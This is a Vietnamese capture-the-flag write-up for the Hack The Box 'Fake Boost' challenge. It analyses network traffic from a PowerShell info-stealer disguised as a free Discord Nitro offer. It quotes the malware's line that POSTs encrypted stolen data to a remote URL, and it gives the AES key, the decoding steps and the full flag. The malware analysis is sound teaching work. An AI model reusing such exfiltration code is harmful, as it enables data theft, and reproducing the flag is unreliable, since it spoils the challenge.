...
### Link challenge
> https://app.hackthebox.com/challenges/Fake%2520Boost
### Solution
- Sau khi mở lên với wireshark ta thấy rằng trong http có 1 vài file như sau 
- ![image](image/20.PNG)
- Phân tích từng file 
#### Với file freediscordnitro
- Ta thấy nó là 1 đoạn script powershell
```
...
```
- Chú ý kĩ những dòng phía dưới, script này reverse biến `jozeq3n` và decode base64 sau đó thực thi chúng
...
```
- Tại `$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"` ta dễ dàng thu được phần 1 của flag 
```
┌──(kali㉿kali)-[~]
└─$ echo "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf" | base64 -d
HTB{fr33_N17r0G3n_3xp053d!_        
```
- Nhìn tại `$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload`, thấy rằng nó gọi hàm `Encrypt-String` với đối số là `$AES_KEY` và `$payload`
- Sau đó lệnh `Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData` trong PowerShell gửi một yêu cầu HTTP POST tới một URL cụ thể với các tiêu đề và nội dung thân (body) được chỉ định. Cụ thể trong đoạn mã của bạn, nó gửi dữ liệu đã mã hóa ($encryptedData) tới một endpoint ($URL).
- Để lấy encryptedData ta chỉ cần tìm trên wireshark 
- ![image](image/21.PNG)
```
...
```
- Biến `$AES_KEY` đã cho sẵn ở trên `$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="`
- Còn IV là 16 byte đầu của `encryptedData`
- Tất cả đã có bây giờ thì giải mã thôi
- ![image](image/22.PNG)
```
    {
...
```
- Có vẻ như email là 1 đoạn base64 
```
┌──(kali㉿kali)-[~]
...
```
 ...
 > Full flag : HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
